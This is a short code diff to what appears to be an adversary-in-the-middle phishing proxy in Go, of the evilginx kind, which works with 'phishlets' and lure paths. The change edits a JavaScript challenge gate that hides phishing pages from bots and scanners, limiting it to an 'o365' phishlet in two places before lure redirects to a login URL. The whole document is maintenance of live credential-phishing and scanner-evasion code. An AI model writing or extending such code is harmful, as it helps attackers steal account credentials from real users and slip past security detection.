@@ -476,8 +476,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								// JS challenge gate — bots that don't execute JS never pass.
-								if !p.isChallengePassed(from_ip) {
+								// JS challenge gate — only for o365/GoDaddy phishlets
+								if pl.Name == "o365" && !p.isChallengePassed(from_ip) {
 									return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 								}
 
@@ -687,8 +687,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
-						// JS challenge gate — must pass before any redirect
-						if !p.isChallengePassed(from_ip) {
+						// JS challenge gate — only for o365/GoDaddy phishlets
+						if pl.Name == "o365" && !p.isChallengePassed(from_ip) {
 							return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 						}
 						// redirect from lure path to login url
